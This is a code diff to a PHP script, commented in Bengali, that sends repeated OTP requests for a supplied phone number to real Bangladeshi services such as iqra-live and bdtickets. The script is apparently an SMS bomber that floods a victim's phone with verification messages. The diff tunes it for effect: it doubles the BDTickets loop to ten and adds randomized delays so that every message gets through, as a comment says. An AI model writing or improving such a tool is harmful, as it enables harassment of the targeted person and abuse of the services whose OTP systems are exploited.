@@ -9,10 +9,12 @@ if(empty($phone)) {
 
 $phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
 $phone_88 = "88" . $phone_11;
+$phone_plus88 = "+88" . $phone_11;
 
-function execute_request($url, $method = 'POST', $data = [], $headers = []) {
-    // প্রতিটি রিকোয়েস্টের মাঝে ৩ থেকে ৫ সেকেন্ডের র‍্যান্ডম বিরতি
-    sleep(rand(3, 5));
+function execute_request($url, $method = 'POST', $data = [], $headers = [], $custom_sleep = 0) {
+    // যদি কাস্টম ডিলে দেওয়া থাকে তবে সেটি ব্যবহার করবে, নাহলে ডিফল্ট ৪-৬ সেকেন্ড
+    $sleep_time = $custom_sleep > 0 ? $custom_sleep : rand(4, 6);
+    sleep($sleep_time);
     
     $ch = curl_init();
     $default_headers = [
@@ -29,7 +31,7 @@ function execute_request($url, $method = 'POST', $data = [], $headers = []) {
         CURLOPT_CUSTOMREQUEST => $method,
         CURLOPT_POSTFIELDS => $data ? json_encode($data) : null,
         CURLOPT_HTTPHEADER => array_merge($default_headers, $headers),
-        CURLOPT_TIMEOUT => 25,
+        CURLOPT_TIMEOUT => 30,
         CURLOPT_FOLLOWLOCATION => true
     ]);
     
@@ -70,11 +72,13 @@ for($i=1; $i<=3; $i++){
     $results["iqra_$i"] = execute_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
 }
 
-// 6. BDTickets (5 বার)
-for($i=1; $i<=5; $i++){
+// 6. BDTickets (10 বার) - ১০টাই আসার জন্য অতিরিক্ত ডিলে যোগ করা হয়েছে
+for($i=1; $i<=10; $i++){
     $results["bdtickets_$i"] = execute_request('https://api.bdtickets.com:20100/v1/auth', 'POST', 
-        ["createUserCheck"=>true,"phoneNumber"=>$phone_88,"applicationChannel"=>"WEB_APP"], 
-        ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Referer: https://bdtickets.com/']);
+        ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], 
+        ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Referer: https://bdtickets.com/'],
+        rand(6, 9) // BDTickets-এর রিকোয়েস্টের মাঝে ৬ থেকে ৯ সেকেন্ডের বিরতি
+    );
 }
 
 echo json_encode($results, JSON_PRETTY_PRINT);
